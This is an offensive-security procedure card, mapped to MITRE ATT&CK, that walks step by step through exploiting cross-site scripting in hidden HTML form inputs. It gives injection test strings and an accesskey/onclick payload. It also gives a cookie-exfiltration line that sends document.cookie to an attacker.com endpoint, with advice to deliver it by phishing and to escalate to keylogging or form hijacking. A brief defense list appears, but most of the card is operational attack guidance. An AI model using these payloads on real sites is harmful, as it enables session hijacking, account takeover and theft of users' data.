---
id: 1a2fed98-34a8-44d9-937a-021971e1ac84
name: Hidden-Input-XSS-Attack
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:41.872756+00:00'
updated_at: '2023-04-10T20:21:31.538401+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Command-and-Scripting-Interpreter|T1059 - Command and Scripting
    Interpreter]]
sub_techniques:
  - '[[sub-techniques/JavaScript|T1059.007 - JavaScript]]'
tags:
  - '[[tags/Cross-Site-Scripting]]'
  - '[[tags/XSS-in-Hidden-Input]]'
  - '[[tags/XSS-in-HTML-Applications]]'
  - xss
  - javascript-execution
commands: []
platforms:
  - Web
tools: []
skill_level: beginner
impact_level: medium
detection_risk: low
validated: true
---

# Hidden-Input-XSS-Attack

## Summary

The Hidden Input XSS Attack exploits vulnerable HTML forms by injecting malicious JavaScript into hidden input fields, allowing execution in the victim's browser context when the form is interacted with or submitted. This technique can steal session cookies, perform unauthorized actions, or redirect users to attacker-controlled sites, commonly used in reflected or stored XSS scenarios targeting web applications with insufficient input sanitization.

## Description

This procedure demonstrates how to identify and exploit hidden input fields in web forms that fail to sanitize user-supplied data reflected into the 'value' attribute or allow HTML injection. From an offensive security perspective, attackers can craft payloads that execute JavaScript upon form submission or user interaction, such as focusing the field via keyboard shortcuts. The attack relies on the browser executing inline event handlers like 'onclick' without proper escaping. Target environments include legacy web apps, CMS platforms, or custom forms without Content Security Policy (CSP). Successful exploitation grants the attacker the victim's session privileges, enabling data theft or account takeover. Prerequisites include access to a vulnerable endpoint, often discovered via reconnaissance or fuzzing form parameters.

## Requirements

1. Access to a web application with forms containing hidden input fields that reflect user input without sanitization.
2. Basic knowledge of HTML, JavaScript, and browser behavior.
3. A web proxy tool like Burp Suite to intercept and modify requests (optional but recommended for testing).
4. Attacker-controlled domain for exfiltration (e.g., to capture stolen data).

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and output encoding (e.g., HTML entity encoding for attributes) to prevent script injection.
- Deploy Content Security Policy (CSP) headers to restrict inline script execution and external resource loading.
- Use Web Application Firewalls (WAFs) to detect and block common XSS payloads in form data.
- Regularly scan applications with tools like OWASP ZAP or Burp Suite for reflected/stored XSS vulnerabilities.
- Enable browser security features like XSS Auditor (deprecated in modern browsers) or rely on modern CSP enforcement.

## Objectives

1. Identify a vulnerable hidden input field in a web form that allows HTML/JS injection.
2. Inject and trigger a malicious JavaScript payload to execute in the victim's browser.
3. Exfiltrate sensitive data such as cookies or session tokens to the attacker.

## Instructions

### Step 1: Identify Vulnerable Hidden Input

**Context**: Locate forms with hidden inputs that echo back user-supplied data in the 'value' attribute without proper escaping, allowing HTML tag injection.

Inspect the target form using browser developer tools or a proxy. Submit test inputs like `<script>alert(1)</script>` to the hidden field parameter and check if it reflects unsanitized.

> If the input is reflected as-is (e.g., `<input type="hidden" value="<script>alert(1)</script>">`), the field is vulnerable to XSS.

### Step 2: Craft the Malicious Payload

**Context**: Create an HTML snippet for the hidden input that includes an event handler to execute JavaScript upon interaction, bypassing visibility restrictions.

Use the following payload, which creates a hidden input with an 'onclick' event triggered by a keyboard shortcut (CTRL+SHIFT+X). This payload should be injected into the reflected value or stored in the form.

**Code** ([[codes/Hidden-Input-XSS-with-Keyboard-Trigger]]):

```html
<input type="hidden" accesskey="X" onclick="alert(1)">
Use CTRL+SHIFT+X to trigger the onclick event
```

> The 'accesskey' attribute allows focusing the hidden field via keyboard (CTRL+SHIFT+X on most browsers), triggering the 'onclick' to execute the alert. Replace 'alert(1)' with a real payload, e.g., `document.location='http://attacker.com/steal?cookie='+document.cookie` for exfiltration.

### Step 3: Inject and Test the Payload

**Context**: Deliver the payload to the vulnerable form and verify execution in the victim's context.

Intercept the form submission using a proxy, modify the hidden input parameter to include the payload wrapped in HTML tags if needed (e.g., value="<input type=\"hidden\" accesskey=\"X\" onclick=\"alert(1)\">"). Submit the form and interact with the page (press CTRL+SHIFT+X) to trigger execution.

> In a real attack, deliver via phishing (e.g., malicious link to a reflected search form) or stored XSS (e.g., admin panel upload).

### Step 4: Verify Execution and Exfiltrate

**Context**: Confirm the JavaScript runs and captures data.

Monitor for the alert or check attacker server logs for exfiltrated data. If successful, the payload executes as the victim, accessing their session.

> Success is indicated by the alert popping or data appearing on the attacker's endpoint. Escalate by chaining to keylogging or form hijacking.
